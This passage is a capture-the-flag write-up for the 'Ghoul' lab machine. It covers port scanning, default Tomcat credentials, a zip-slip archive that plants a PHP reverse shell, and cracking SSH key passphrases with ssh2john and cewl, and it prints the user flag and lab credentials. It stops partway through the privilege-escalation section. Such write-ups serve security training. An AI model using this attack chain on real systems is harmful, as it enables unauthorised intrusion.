I"¨<h1 id="user">USER</h1>

<p>As usual we always start with <strong>Nmap</strong> scanning:</p>

<pre>root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report

</pre>

<p>Due to the fact that there doesnâ€™t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.</p>

<pre> /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s

/index.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/contact.html (Status: 200)
/archives (Status: 301)
/uploads (Status: 301)
/users (Status: 301)
/css (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/less (Status: 301)
/server-status (Status: 403)
</pre>

<p>This reveals an interesting page, secret.php.
It shows a chat between system admins  talking about an RCE on the current infrastructure.</p>

<p><img src="/images/Ghoul/secret_1.png" alt="" /></p>

<p>Due to the fact that the enumeration didnâ€™t show anything else interesting here I swapped port and went to port 8080. I then tried <strong>admin:admin</strong> and it worked, revealing a website for uploading images or zip files on the server.</p>

<p><img src="/images/Ghoul/zip_2.png" alt="" /></p>

<p>After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.</p>

<p>The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:</p>

<pre>
zip ziplib_www.zip ../../../../../var/www/html/rev.php
</pre>

<p><img src="/images/Ghoul/zip_slip_3.png" alt="" /></p>

<p>Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.</p>

<p><img src="/images/Ghoul/rev_4.png" alt="" /></p>

<p>Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro.
LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users.
Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:</p>

<pre> python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup </pre>

<p>After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.</p>

<pre>cewl http://10.10.10.101/secret.php &gt; cewl.txt</pre>

<p>And finally I got it cracked!</p>

<p><img src="/images/Ghoul/ssh_pswd_5.png" alt="" /></p>

<p>The ssh decryption password for kaneki ssh is <strong>ILoveTouka</strong> and I am finally able to login as kaneki. 
Got user !</p>

<p>user.txt
7c0f11041f210f4f7d1711d40a1c35c2</p>

<h1 id="root">ROOT</h1>

<p>The first thing to notice are two notes present into the home folder of kaneki:</p>

<pre>note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts

notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.</pre>

<p>These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.</p>

<p>Indeed, looking at ifconfig:</p>

<p><img src="/images/Ghoul/ifconfig_6.png" alt="" /></p>

<p>So apparently there is an internal network 172.20.0.0/24 and we need to explore it.
Indeed, after uploading nmap and having run:</p>

<pre>nmap -p-  172.20.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00026s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.00028s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00030s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh</pre>

<p>Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file:
/usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :</p>

<pre> user username="admin" password="test@aogiri123" roles="admin" </pre>

<p>Maybe it would be usefull later on.
So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:</p>

<pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl <b>kaneki_pub@kaneki-pc&lt;\b&gt;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri&lt;/pre&gt;
</b></pre>
:ET